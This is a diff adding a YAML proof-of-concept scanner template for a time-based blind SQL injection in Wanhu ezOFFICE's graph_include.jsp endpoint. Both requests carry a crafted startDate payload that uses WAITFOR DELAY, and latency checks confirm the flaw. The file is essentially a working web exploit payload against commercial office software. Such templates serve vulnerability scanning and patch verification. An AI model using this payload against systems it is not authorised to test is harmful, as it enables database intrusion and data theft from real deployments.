@@ -1,0 +1,28 @@
+name: poc-yaml-wanhuOA-ezOFFICE-graph_include-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:6%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: GET
+      path: /defaultroot/platform/report/graphreport/graph_include.jsp?id=2&startDate=2022-01-01%2000:00:00.000%27%20as%20datetime)%20group%20by%20t.emp_id,t.empname%20)%20%20s%20group%20by%20empname%20order%20by%20num%20desc%20%20WAITFOR%20DELAY%20%270:0:10%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 10000 && response.latency <= 11000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486291&idx=1&sn=a747638a55572874c18a6bad950694ab&chksm=c267be60f5103776cf53c2c1a66ae086270736be13847bf69336f4fcd064fe2c7cb21b9074bc&token=661111678&lang=zh_CN#rd
+
+
